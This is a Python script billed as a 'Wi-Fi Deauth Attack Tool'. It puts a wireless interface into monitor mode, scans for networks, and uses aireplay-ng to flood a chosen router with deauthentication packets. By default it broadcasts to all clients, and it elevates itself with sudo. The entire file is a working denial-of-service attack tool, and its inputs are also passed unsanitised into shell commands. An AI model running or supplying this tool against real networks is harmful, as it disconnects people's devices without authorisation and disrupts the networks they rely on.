import subprocess
import sys
import time
import os

def run_cmd(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout.strip()

def enable_monitor_mode(interface):
    print("[*] Enabling monitor mode...")
    subprocess.run(f"airmon-ng start {interface}", shell=True)
    return interface

def scan_networks(mon_interface):
    print("[*] Scanning for networks (press Ctrl+C after few seconds)...")
    try:
        subprocess.run(f"airodump-ng {mon_interface}", shell=True)
    except KeyboardInterrupt:
        print("\n[*] Network scan stopped by user.")

def deauth_attack(mon_interface, target_bssid, target_channel, target_client="FF:FF:FF:FF:FF:FF", packets=10):
    print(f"[*] Setting channel to {target_channel}...")
    subprocess.run(f"iwconfig {mon_interface} channel {target_channel}", shell=True)
    
    print(f"[*] Sending {packets} deauth packets to BSSID {target_bssid} targeting client {target_client}...")
    subprocess.run(f"aireplay-ng --deauth {packets} -a {target_bssid} -c {target_client} {mon_interface}", shell=True)

def main():
    interface = input("Enter your Wi-Fi interface (e.g., wlan0): ")
    mon_interface = enable_monitor_mode(interface)
    
    scan_networks(mon_interface)
    
    target_bssid = input("Enter target BSSID (router MAC address): ")
    target_channel = input("Enter target Channel: ")
    target_client = input("Enter client MAC (or leave blank for broadcast): ") or "FF:FF:FF:FF:FF:FF"
    packets = input("Number of deauth packets (default 10): ") or "10"
    
    deauth_attack(mon_interface, target_bssid, target_channel, target_client, packets)

    print("[*] Attack completed.")

if __name__ == "__main__":
    subprocess.run(["clear"], check=True)
    print("Welcome to the Wi-Fi Deauth Attack Tool")

    if not os.path.exists("/usr/sbin/airmon-ng") or not os.path.exists("/usr/sbin/aireplay-ng"):
        print("❌ Required tools (airmon-ng, aireplay-ng) are not installed. Please install them first.")
        exit(1)

    if os.geteuid() != 0:
        print("🔄 Restarting script with sudo...")
        os.execvp("sudo", ["sudo"] + ["python3"] + sys.argv)
    
    main()